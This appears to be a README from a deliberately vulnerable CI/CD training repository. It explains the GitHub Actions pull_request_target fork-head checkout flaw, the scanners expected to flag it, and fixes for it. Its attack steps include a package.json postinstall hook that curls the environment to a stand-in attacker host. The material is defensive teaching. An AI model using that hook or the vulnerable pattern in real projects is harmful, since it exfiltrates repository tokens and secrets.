# Scenario 01: pull_request_target with fork-head checkout

**OWASP CICD-SEC mapping:** CICD-SEC-4 (Poisoned Pipeline Execution),
CICD-SEC-5 (Insufficient Pipeline-Based Access Controls)

**Vulnerable workflow:** [`.github/workflows/scenario-01-prtarget-checkout-head.yml`](../../.github/workflows/scenario-01-prtarget-checkout-head.yml)

## The pattern

`pull_request_target` is identical to `pull_request` *except* it runs in the
**base repo's context** (with its `secrets` and a `GITHUB_TOKEN` scoped per the
base's `permissions:`). It exists so maintainers can comment/label fork PRs
with privileges fork PRs don't normally get.

The footgun: the default checkout for `pull_request_target` is the base ref,
not the PR head. The moment you `checkout` the head SHA, you import
attacker-controlled code into the privileged context. If anything that
checkout produces is then executed — `npm ci`, `npm test`, `pip install`, any
script — the fork PR author has RCE with the base repo's token and every org
secret the workflow can see.

## How an attacker exploits it

1. Fork the repo.
2. In the fork, modify `package.json` to add a `postinstall` hook:
   ```json
   "scripts": { "postinstall": "curl -d \"$(env)\" attacker.tld" }
   ```
3. Open a PR back to the base repo. The base's `pull_request_target` workflow
   triggers, checks out the fork's head SHA, runs `npm ci`, which fires the
   postinstall script — exfiltrating `GITHUB_TOKEN` and every secret the
   workflow injected as env.

## Expected scanner coverage

| Scanner   | Detection |
|-----------|-----------|
| zizmor    | `dangerous-triggers` + `unsafe-checkout` (PR head with pull_request_target) |
| poutine   | `pull_request_target_checkout` |
| checkov   | `CKV2_GHA_*` (pull_request_target + checkout head) |
| kics      | `Pull Request Target Misuse` |

## Fix

If you need to comment on fork PRs, do so without checking out fork code.
If you must build/test it, use `pull_request` instead and accept that you
won't have base secrets, or split into two workflows:

- `pull_request` workflow does the build (untrusted, no secrets, ephemeral).
- `workflow_run` (or scheduled job) reads the result *without executing
  artifact contents* — see [Scenario 07](../07-workflow-run-artifact-rce/README.md)
  for how to do *that* safely too.

## References

- GitHub Security Lab — "Keeping your GitHub Actions and workflows secure":
  https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
- zizmor docs — `dangerous-triggers`: https://docs.zizmor.sh/audits/#dangerous-triggers
